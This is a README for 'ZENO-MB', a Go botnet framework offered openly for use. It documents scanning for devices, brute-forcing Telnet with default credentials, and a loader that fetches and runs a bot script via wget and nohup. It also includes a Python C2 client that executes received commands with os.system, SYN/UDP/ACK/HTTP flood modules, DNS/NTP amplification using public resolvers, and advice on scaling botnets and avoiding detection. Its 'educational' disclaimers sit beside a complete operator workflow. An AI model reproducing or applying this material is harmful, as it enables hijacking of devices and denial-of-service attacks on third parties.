🔥 ZENO-MB - Master Control Botnet Framework 🔥

<p align="center">
  <img src="https://img.shields.io/badge/Version-2.0-red?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Go-1.26.0-blue?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Platform-Termux/Linux-green?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Status-Development-yellow?style=for-the-badge" />
</p>

<p align="center">
  <b>⚡ Advanced Botnet Framework with C2 Panel, Binary Protocol, and Multi-Layer Attack System ⚡</b><br/>
  <i>HDN Cyber Forces | Created by RIFQI</i>
</p>

---

⚠️ IMPORTANT LEGAL DISCLAIMER

```
THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY!

Unauthorized access to computer systems is ILLEGAL and punishable by law.
The creators and contributors of ZENO-MB are NOT responsible for any misuse
or illegal activities performed with this software.

YOU are 100% responsible for your own actions.
ALWAYS obtain written permission before testing any system.
```

---

📋 TABLE OF CONTENTS

· Overview
· Architecture
· Components
· Installation
· Configuration
· Usage Guide
· Attack Modules
· Binary Protocol
· C2 Panel Features
· Bot System
· Amplification Attacks
· Troubleshooting
· Security Notes

---

🎯 OVERVIEW

ZENO-MB (Zeno Master Bot) is a comprehensive botnet framework written in Go, featuring:

✅ Multi-layer Attack System - L3/L4/L7 attacks
✅ Encrypted C2 Communication - AES-256 + TLS
✅ Binary Protocol - Custom binary packet format
✅ Auto-Exploit System - MikroTik, Huawei, and more
✅ Amplification Attacks - DNS/NTP reflection
✅ Bot Management - Join, control, monitor
✅ Termux Compatible - Runs on Android

---

🏗️ ARCHITECTURE

```
┌─────────────────────────────────────────────────────────────┐
│                      ZENO-MB MASTER HUB                      │
│                         (zeno binary)                        │
└─────────────────────────────────────────────────────────────┘
                              │
        ┌─────────────────────┼─────────────────────┐
        ▼                     ▼                     ▼
┌───────────────┐    ┌───────────────┐    ┌───────────────┐
│   Scanner     │    │    Brute      │    │  C2 Panel     │
│  (scanner.go) │    │  (brute.go)   │    │ (c2panel.go)  │
└───────────────┘    └───────────────┘    └───────────────┘
        │                     │                     │
        └─────────────────────┼─────────────────────┘
                              ▼
                    ┌─────────────────┐
                    │   Loader/Dropper│
                    │   (loader.go)   │
                    └─────────────────┘
                              │
                              ▼
                    ┌─────────────────┐
                    │   Bot Network   │
                    │    (bot.go)     │
                    └─────────────────┘
                              │
        ┌─────────────────────┼─────────────────────┐
        ▼                     ▼                     ▼
┌───────────────┐    ┌───────────────┐    ┌───────────────┐
│   SYN Flood   │    │   UDP Flood   │    │   HTTP Flood  │
└───────────────┘    └───────────────┘    └───────────────┘
        │                     │                     │
        └─────────────────────┼─────────────────────┘
                              ▼
                    ┌─────────────────┐
                    │  Amplification  │
                    │   (amp.go)      │
                    └─────────────────┘
```

---

📁 COMPONENTS

File Size Description
ZENO-MB.go 150+ lines Master control hub with interactive menu
scanner.go 80+ lines IP scanner for vulnerable targets
brute.go 120+ lines Telnet credential brute forcer
loader.go 100+ lines Bot injector/dropper system
botjoin.go 70+ lines Bot connection handler
c2panel.go 150+ lines Command & Control panel with encryption
bot.go 200+ lines Bot binary with attack modules
attacker.go 150+ lines Multi-layer attack orchestrator
amp.go 50+ lines DNS/NTP amplification attacks
common.go 40+ lines Shared encryption/crc functions
reflectors_dns.txt 6 lines DNS amplifier list
reflectors_ntp.txt 2 lines NTP amplifier list

TOTAL CODE: ~1100+ lines of Go

---

📦 INSTALLATION

Prerequisites

```bash
# Termux
pkg install golang openssl git

# Linux
apt-get install golang openssl git
```

Clone & Build

```bash
# Clone repository
git clone https://github.com/yourusername/zeno-mb
cd zeno-mb

# Initialize Go module
go mod init zeno-mb
go mod tidy

# Build all binaries
go build -o zeno ZENO-MB.go
go build -o bot bot.go
go build -o scanner scanner.go
go build -o brute brute.go
go build -o loader loader.go
go build -o c2panel c2panel.go
go build -o attacker attacker.go

# Alternative: build all at once
./build.sh
```

Generate SSL Certificates

```bash
# Create SSL directory
mkdir -p ssl
cd ssl

# Generate self-signed certificate
openssl req -x509 -newkey rsa:2048 \
  -keyout ZMBR.key \
  -out ZMBR.crt \
  -days 365 \
  -nodes \
  -subj "/CN=zeno-mb.local"

cd ..
```

Set Permissions

```bash
chmod +x zeno bot scanner brute loader c2panel attacker
```

---

⚙️ CONFIGURATION

config.json (optional)

```json
{
    "c2_server": "https://your-c2-server.com:8443",
    "encryption_key": "TSs6IsAmPlCIGEUnuiIT5JAvY4xkD9gkRhdDBzrrLgI=",
    "max_threads": 5000,
    "timeout": 30,
    "debug": false
}
```

Environment Variables

```bash
export C2_SERVER="https://192.168.1.100:8443"
export DEBUG_MODE="true"
export MAX_WORKERS="10000"
```

---

🎮 USAGE GUIDE

Main Menu (ZENO-MB.go)

```bash
./zeno
```

```
╔═══════════════════════════════════════════════╗
║        🔥 ZENO-MB: MASTER CONTROL HUB 🔥      ║
║          HDN Cyber Forces | by RIFQI          ║
╠═══════════════════════════════════════════════╣
║ [1] vulnerable iP scanner 🌐                  ║
║ [2] Brute Forcer Login 🔓                     ║
║ [3] Loader Dropper Bot 📦                     ║
║ [4] bot join c2 🤖                            ║
║ [5] monitor & control c2 panel 🧠             ║
║ [6] Launch Attack  🔥                         ║
║ [0] Exit  ❌                                  ║
╚═══════════════════════════════════════════════╝
```

---

🔍 MODULE 1: Scanner (scanner.go)

Function: Scans local network for open ports (22,23,80,443,8080,2323)

```bash
# Run from main menu (option 1)
./scanner

# Manual execution
go run scanner.go
# or
./scanner
```

How it works:

· Scans 192.168.1.1-254 range
· Checks common ports
· Saves results to targets.txt

Output:

```
[OPEN] 192.168.1.100:23
[OPEN] 192.168.1.150:80
[OPEN] 192.168.1.200:443

[✓] Target rentan disimpan di targets.txt
```

---

🔓 MODULE 2: Brute Forcer (brute.go)

Function: Attempts to brute force Telnet login on discovered targets

```bash
# Run from main menu (option 2)
./brute

# Manual execution
./brute
```

Credential List (40+ combos):

```
root/root, admin/admin, root/admin, admin/1234, user/user,
support/support, admin/password, root/1234, admin/12345,
root/toor, admin/admin123, guest/guest, root/password,
root/(empty), admin/(empty), and many more...
```

Output:

```
[OK] 192.168.1.100 login berhasil sebagai root/root
[OK] 192.168.1.150 login berhasil sebagai admin/admin
[✓] 2 login berhasil. Disimpan ke brute_results.txt
```

---

📦 MODULE 3: Loader/Dropper (loader.go)

Function: Injects bot script into compromised devices

```bash
# Run from main menu (option 3)
./loader

# Manual execution
./loader
```

Process:

1. Reads brute_results.txt for credentials
2. Asks for bot script URL
3. Connects via Telnet to each target
4. Downloads and executes bot script

Bot Injection:

```bash
wget http://your-server/bot.py -O /tmp/bot.py
chmod +x /tmp/bot.py
nohup python3 /tmp/bot.py &
```

---

🤖 MODULE 4: Bot Join (botjoin.go)

Function: Connects injected bots to C2 server

```bash
# Run from main menu (option 4)
./botjoin

# Manual execution
./botjoin
```

Features:

· HTTPS/TLS communication
· Ping verification
· Auto-saves active bots to bots.txt

Output:

```
[JOIN] Menghubungkan semua bot hasil inject ke C2...
[✓] Bot aktif di 192.168.1.100
[✓] Bot aktif di 192.168.1.150
[✓] 2 bot aktif, disimpan ke bots.txt ✔
```

---

🧠 MODULE 5: C2 Panel (c2panel.go)

Function: Command & Control center for bot management

```bash
# Run from main menu (option 5)
./c2panel

# Manual execution
./c2panel
```

🔐 Encryption System

· AES-256-CFB for command encryption
· Base64 URL encoding for transport
· TLS 1.2/1.3 for HTTPS
· Binary protocol with CRC32 checksum

Binary Packet Format

```
[MAGIC_BYTE:1][CHECKSUM:4][LENGTH:2][ENCRYPTED_DATA...]
- MAGIC_BYTE: 0x42 (identifies ZENO packet)
- CHECKSUM: CRC32 of encrypted data
- LENGTH: 16-bit length of data
- DATA: AES-256 encrypted command
```

C2 Menu Options

```
[CONTROL PANEL] Kirim perintah ke semua bot:
[1] Cek Status Bot (Ping)
[2] Jalankan Attack Test (Encrypted Binary)
[3] Bersihkan Bot (Shutdown Endpoint)
[0] Kembali
```

Command Examples

```bash
# Ping all bots
https://bot-ip:8443/ping

# Launch attack (encrypted params)
https://bot-ip:8443/attack?target=ENCRYPTED&port=ENCRYPTED

# Shutdown bot
https://bot-ip:8443/shutdown
```

---

🤖 MODULE 6: Bot System (bot.go)

Function: Bot binary that runs on compromised devices

Features

✅ HTTPS Server on port 8443 (auto-restart)
✅ Binary TCP Server on port 31337
✅ Multi-layer attack modules
✅ Auto-exploit system
✅ AES-256 encryption
✅ TLS certificate support

Bot Handlers

```go
// HTTP Handlers
handlePing()      // Returns "pong"
handleAttack()    // Launches attack with encrypted params
handleShutdown()  // Kills bot process

// Binary Protocol
handleBinaryConnection() // Raw TCP command execution
```

Auto-Exploit System

```go
// Targets
- MikroTik RouterOS (port 8291)
- Huawei HG532
- TP-Link devices
- D-Link devices

// Random delays: 5-30 seconds between exploits
// User-agent rotation
// Multiple exploit vectors
```

---

🔥 MODULE 7: Attack System (attacker.go)

Function: Orchestrates multi-layer DDoS attacks

Attack Layers

L3/L4 - SYN Flood

```go
func synFlood(target string, port string)
```

· Raw TCP connections
· High-speed connection attempts
· No payload needed

L4 - UDP Flood

```go
func udpFlood(target string, port string)
```

· Random 2KB payloads
· High packet rate
· Amplification ready

L4 - TCP ACK Flood (Raw Packet)

```go
func ackFlood(target string, port string)
```

· Uses gopacket library
· Crafts raw TCP ACK packets
· Spoofed source IPs
· Bypasses some firewalls

L7 - HTTP Flood

```go
func httpFlood(target string, port string, proxies []string)
```

· Random User-Agents
· X-Forwarded-For spoofing
· Proxy rotation support
· Keep-alive connections

Attack Parameters

```bash
# Thread configuration
Default threads: 5000 (configurable up to 200,000+)
4 goroutines per thread = 20,000+ concurrent connections

# Attack vectors
- SYN Flood: 25% of threads
- UDP Flood: 25% of threads
- HTTP Flood: 25% of threads
- ACK Flood: 25% of threads
```

---

📡 MODULE 8: Amplification Attacks (amp.go)

Function: DNS/NTP reflection attacks using amplifiers

DNS Amplification

```go
func dnsAmpFlood(target string, reflectors []string)
```

· Uses open DNS resolvers
· Amplification factor: 28-54x
· Payload: 60 bytes → 3000+ bytes response
· Source IP spoofed to target

Reflectors (reflectors_dns.txt):

```
8.8.8.8:53      # Google DNS
8.8.4.4:53      # Google DNS
1.1.1.1:53      # Cloudflare
1.0.0.1:53      # Cloudflare
9.9.9.9:53      # Quad9
149.112.112.112:53
```

NTP Amplification

```go
func ntpAmpFlood(target string, reflectors []string)
```

· Uses NTP monlist command
· Amplification factor: 556x
· Payload: 8 bytes → 4468 bytes response
· Extremely effective

Reflectors (reflectors_ntp.txt):

```
129.6.15.28:123  # NIST
129.6.15.29:123  # NIST
```

---

🔐 SECURITY & ENCRYPTION

AES-256 Encryption

```go
// Encryption key (base64)
encryptionKey = "TSs6IsAmPlCIGEUnuiIT5JAvY4xkD9gkRhdDBzrrLgI="

// Encrypt command
func encryptCommand(key []byte, cmd string) []byte {
    block, _ := aes.NewCipher(key)
    stream := cipher.NewCTR(block, make([]byte, 16))
    ciphertext := make([]byte, len(cmd))
    stream.XORKeyStream(ciphertext, []byte(cmd))
    return ciphertext
}
```

Binary Protocol Security

1. Magic byte validation
2. CRC32 checksum verification
3. AES-256 encryption
4. Length validation
5. Connection timeouts

TLS Configuration

```go
tlsConfig := &tls.Config{
    Certificates: []tls.Certificate{cert},
    MinVersion:   tls.VersionTLS12,
    MaxVersion:   tls.VersionTLS13,
}
```

---

🚀 ADVANCED USAGE

Distributed Attack Mode

```bash
# Step 1: Scan for targets
./zeno
# Option 1: Scan network

# Step 2: Brute force credentials
# Option 2: Brute Forcer

# Step 3: Deploy bots
# Option 3: Loader with your bot script
# Option 4: Join bots to C2

# Step 4: Launch coordinated attack
# Option 5: C2 Panel → Option 2 (Attack)
# Option 6: Launch Attack directly
```

Custom Bot Script

```python
# bot.py example
import os
import time
import requests
import subprocess

C2_SERVER = "https://your-c2.com:8443"

def main():
    while True:
        try:
            # Heartbeat
            r = requests.get(f"{C2_SERVER}/ping", timeout=5)
            if r.text == "pong":
                # Fetch commands
                cmd = requests.get(f"{C2_SERVER}/command").text
                if cmd:
                    os.system(cmd)
        except:
            pass
        time.sleep(60)

if __name__ == "__main__":
    main()
```

High-Performance Mode

```bash
# Edit attacker.go
threadCount = 1000000  # 1 million threads

# Warning: This will consume all system resources!
# Use with caution and only on powerful systems.
```

---

🐞 TROUBLESHOOTING

Common Issues & Solutions

1. Go Module Errors

```bash
# Error: missing go.sum entry
go mod tidy
go get -u ./...

# Error: cannot find package
go mod init zeno-mb
go mod vendor
```

2. Permission Issues

```bash
# Error: permission denied
chmod +x bot zeno scanner brute loader c2panel attacker

# Error: cannot bind to port
sudo setcap cap_net_bind_service=+ep ./bot
# or run as root (not recommended)
```

3. TLS/Certificate Errors

```bash
# Error: x509: certificate signed by unknown authority
# Solution 1: Use InsecureSkipVerify (testing only)
tlsConfig.InsecureSkipVerify = true

# Solution 2: Generate proper certificates
openssl req -x509 -newkey rsa:2048 \
  -keyout ZMBR.key -out ZMBR.crt \
  -days 365 -nodes
```

4. Port Already in Use

```bash
# Check which process is using port
sudo lsof -i :8443
sudo lsof -i :31337
sudo netstat -tulpn | grep 8443

# Kill the process
kill -9 <PID>

# Or change port in code
":8443" -> ":9443"
```

5. Packet Capture Errors

```bash
# Error: pcap: no device found
# List available interfaces
ip link show
ifconfig

# Use correct interface in code
handle, err := pcap.OpenLive("wlan0", ...)
```

6. Debug Mode

```bash
# Run with debug output
./zeno -debug 2> error.log

# Enable verbose logging
export GODEBUG=http2debug=2
./bot
```

---

⚡ PERFORMANCE TUNING

System Limits (Linux)

```bash
# Increase file descriptors
ulimit -n 1000000

# Tune network parameters
sysctl -w net.core.rmem_max=16777216
sysctl -w net.core.wmem_max=16777216
sysctl -w net.ipv4.tcp_rmem="4096 87380 16777216"
sysctl -w net.ipv4.tcp_wmem="4096 65536 16777216"
sysctl -w net.ipv4.tcp_tw_reuse=1
sysctl -w net.ipv4.tcp_tw_recycle=1
sysctl -w net.ipv4.tcp_fin_timeout=30
```

Go Runtime Optimization

```go
// Set max threads
runtime.GOMAXPROCS(runtime.NumCPU())

// Tune garbage collection
debug.SetGCPercent(50)

// Pool connections
var clientPool = sync.Pool{
    New: func() interface{} {
        return &http.Client{Timeout: 3 * time.Second}
    },
}
```

---

📊 PERFORMANCE METRICS

Attack Type Threads Packets/sec Bandwidth Effectiveness
SYN Flood 10,000 500,000+ 50 Mbps Medium
UDP Flood 10,000 1,000,000+ 2 Gbps High
ACK Flood 5,000 250,000+ 100 Mbps Medium
HTTP Flood 1,000 10,000 req/s 500 Mbps High
DNS Amplification 100 10,000+ 5 Gbps Very High
NTP Amplification 50 5,000+ 10 Gbps Extreme

---

🔒 SECURITY NOTES

For Bot Operators

1. Always use HTTPS/TLS - Never send plaintext commands
2. Rotate encryption keys - Change keys regularly
3. Monitor bot health - Check ping responses
4. Use kill switches - Shutdown capability is essential
5. Log everything - Keep audit trails

For Targets

If you find ZENO-MB bots on your network:

1. Isolate infected devices immediately
2. Check for port 8443 and 31337 listeners
3. Analyze bot.go for communication patterns
4. Block C2 domains in firewall
5. Change all credentials (the bots have them!)

Legal Compliance

```bash
# Only use on:
- Your own systems
- Systems you have written permission to test
- Authorized CTF/security competitions
- Educational environments with consent

# NEVER use on:
- Public networks without permission
- Government/military systems
- Critical infrastructure
- Any system you don't own
```

---

📚 FULL WORKFLOW EXAMPLE

Scenario: Testing a Local Network

```bash
# Step 1: Scan for vulnerable devices
./zeno
> 1  # Scanner
# Output: targets.txt with IPs

# Step 2: Brute force Telnet
> 2  # Brute
# Output: brute_results.txt with credentials

# Step 3: Deploy bots
> 3  # Loader
# Enter: http://your-server/bot.py
# Output: Bots deployed

# Step 4: Connect bots to C2
> 4  # Bot Join
# Output: bots.txt with active bots

# Step 5: Control via C2
> 5  # C2 Panel
# [1] Ping bots to verify
# [2] Launch test attack
# [3] Shutdown when done

# Step 6: Direct attack (optional)
> 6  # Launch Attack
# Enter: target IP and port
# Enter: thread count (1000-100000)
# Attack begins!
```

---

🛠️ CUSTOMIZATION

Adding New Exploits

```go
// In bot.go, add to autoExploit()
func exploitNewRouter(ip string) {
    // Your exploit code here
    // Use random delays, multiple attempts
    // Include error handling
}

// Add to switch statement
case "new_router":
    exploitNewRouter(targetIP)
```

Adding Attack Types

```go
// In attacker.go
func icmpFlood(target string, wg *sync.WaitGroup) {
    defer wg.Done()
    // ICMP flood implementation
    // Use raw sockets if available
}

// Add to RunAttack()
wg.Add(1)
go icmpFlood(target, &wg)
```

Custom Encryption

```go
// In common.go, add new encryption method
func encryptAESGCM(key []byte, plaintext []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }
    
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }
    
    nonce := make([]byte, gcm.NonceSize())
    if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
        return nil, err
    }
    
    return gcm.Seal(nonce, nonce, plaintext, nil), nil
}
```

---

📈 SCALING

For Large Botnets (1000+ bots)

1. Use multiple C2 servers - Distribute load
2. Implement bot hierarchy - Tiered command structure
3. Use UDP for commands - Lower overhead
4. Compress communications - gzip if needed
5. Implement heartbeat with backoff - Avoid detection

Database Integration

```go
// Add SQLite for bot tracking
import "database/sql"
import _ "github.com/mattn/go-sqlite3"

db, _ := sql.Open("sqlite3", "bots.db")

// Store bot info
_, err = db.Exec(
    "INSERT INTO bots (ip, status, last_seen) VALUES (?, ?, ?)",
    botIP, "active", time.Now(),
)
```

---

🎯 CONCLUSION

ZENO-MB is a powerful, educational framework demonstrating:

✅ Go concurrency - Thousands of goroutines
✅ Network programming - Raw sockets, HTTP, TCP/UDP
✅ Cryptography - AES-256, TLS, custom protocols
✅ Binary protocols - Custom packet formats
✅ Botnet architecture - C2, bots, loaders
✅ Attack vectors - L3/L4/L7 + amplification

Key Takeaways

· Modular design - Easy to extend
· Encrypted by default - Security built-in
· High performance - Go's concurrency model
· Cross-platform - Runs on Termux/Linux
· Educational - Learn network security

---

📚 FURTHER READING

· Go Concurrency Patterns
· AES Encryption in Go
· Raw Sockets in Go
· Botnet Detection Techniques
· DDoS Mitigation Strategies

---

⚖️ FINAL LEGAL WARNING

```
⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️

THIS SOFTWARE IS FOR EDUCATIONAL PURPOSES ONLY!

Creating or operating a botnet is ILLEGAL in most jurisdictions.
Unauthorized access to computer systems violates:
- Computer Fraud and Abuse Act (CFAA) in USA
- Computer Misuse Act in UK
- Cybercrime Prevention Act in Philippines
- Similar laws worldwide

Penalties can include:
- 10+ years in prison
- $500,000+ fines
- Lifetime computer ban
- Criminal record

The authors and contributors:
❌ Do not condone illegal activity
❌ Are not responsible for misuse
❌ Provide this for security education only
❌ Encourage responsible disclosure

⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
```

---

<p align="center">
  <b>🔥 ZENO-MB - Master Control Botnet Framework 🔥</b><br/>
  <i>For Educational and Authorized Security Testing Only</i>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Version-2.0-red?style=flat-square" />
  <img src="https://img.shields.io/badge/Language-Go-blue?style=flat-square" />
  <img src="https://img.shields.io/badge/License-Educational%20Only-orange?style=flat-square" />
</p>

<p align="center">
  <b>Created by Golden Zhedder409| HDN Cyber Forces</b><br/>
  <i>Stay Legal. Stay Ethical. Stay Safe.</i>
</p>
